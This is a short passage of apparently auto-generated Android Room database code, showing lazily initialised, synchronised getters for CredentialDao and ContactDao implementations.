          _credentialDao = new CredentialDao_Impl(this);
        }
        return _credentialDao;
      }
    }
  }

  @Override
  public ContactDao contactDao() {
    if (_contactDao != null) {
      return _contactDao;
    } else {
      synchronized(this) {
        if(_contactDao == null) {
          _contactDao = new ContactDao_Impl(this);
        }
        return _contactDao;
      }
    }
  }
}
